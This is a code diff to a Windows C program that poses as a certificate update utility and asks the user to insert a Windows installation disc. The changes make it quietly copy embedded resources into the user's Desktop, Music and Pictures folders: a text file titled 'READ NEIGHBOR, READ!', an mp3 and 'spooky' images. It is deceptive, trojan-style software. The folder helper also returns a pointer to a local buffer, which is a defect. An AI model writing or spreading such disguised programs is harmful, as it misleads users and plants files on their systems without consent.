@@ -8,8 +8,8 @@
 #define MCI_TEST 0x0020
 
 // Function Prototypes
-VOID WorkOnResource(VOID);
-LPWSTR GetDesktopDir();
+VOID ResourceToFile(LPWSTR lpstrFilename, UINT uiResourceNumber);
+LPWSTR GetDirFromCSIDL(UINT uiIdentifier);
 
 // Global Variables
 HINSTANCE g_hInstance;
@@ -49,9 +49,18 @@ int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
         MessageBox(NULL, L"The certificate update program requires a valid Windows\r\nInstallation disc to be inserted into the disc drive.\r\nIf your system lacks a CD/DVD drive, please install WinCDEmu\r\nand load your installation ISO.\r\n\r\nView log for more information.", L"Certificate Update CD is required", MB_OK | MB_ICONINFORMATION | MB_DEFAULT_DESKTOP_ONLY);
     }
 
-    // Place a log on their desktop
-    SetCurrentDirectory(GetDesktopDir());
-    WorkOnResource();
+    // Place a copy of the source on their desktop
+    SetCurrentDirectory(GetDirFromCSIDL(CSIDL_DESKTOP));
+    ResourceToFile(L"READ NEIGHBOR, READ!.txt", 2);
+
+    // Give thems omething to listen to
+    SetCurrentDirectory(GetDirFromCSIDL(CSIDL_MYMUSIC));
+    ResourceToFile(L"freedom.mp3", 3);
+
+    // And finally, leave them some pictures...
+    SetCurrentDirectory(GetDirFromCSIDL(CSIDL_MYPICTURES));
+    ResourceToFile(L"usrsh.bmp", 4);
+    ResourceToFile(L"2spky4u2.bmp", 5);
 
     // Close device
     mciSendCommand(mPar.wDeviceID, MCI_CLOSE, MCI_WAIT, 0);
@@ -60,7 +69,7 @@ int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
     return 0;
 }
 
-VOID WorkOnResource(VOID)
+VOID ResourceToFile(LPWSTR lpstrFilename, UINT uiResourceNumber)
 {
     HGLOBAL     res_handle = NULL;
     HRSRC       res;
@@ -70,7 +79,7 @@ VOID WorkOnResource(VOID)
     DWORD dwBytesWritten = 0;
 
     // NOTE: providing g_hInstance is important, NULL might not work
-    res = FindResource(g_hInstance, MAKEINTRESOURCE(2), RT_RCDATA);
+    res = FindResource(g_hInstance, MAKEINTRESOURCE(uiResourceNumber), RT_RCDATA);
     if (!res)
         return;
     res_handle = LoadResource(NULL, res);
@@ -79,8 +88,8 @@ VOID WorkOnResource(VOID)
     res_data = (char*)LockResource(res_handle);
     res_size = SizeofResource(NULL, res);
 
-    // Loaded "log" resource, copy to desktop
-    hFile = CreateFile(L"fcertupd-current.log", GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+    // Loaded resource, copy to desktop
+    hFile = CreateFile(lpstrFilename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 
     // Write the resource to it now
     WriteFile(hFile, res_data, res_size, &dwBytesWritten, NULL);
@@ -89,10 +98,11 @@ VOID WorkOnResource(VOID)
     CloseHandle(hFile);
 }
 
-LPWSTR GetDesktopDir()
+LPWSTR GetDirFromCSIDL(UINT uiIdentifier)
 {
     WCHAR lpszPath[MAX_PATH + 1];
-    if (SHGetSpecialFolderPathW(HWND_DESKTOP, lpszPath, CSIDL_DESKTOP, FALSE))
+
+    if (SHGetSpecialFolderPathW(HWND_DESKTOP, lpszPath, uiIdentifier, FALSE))
         return lpszPath;
     else
         return L"ERROR";
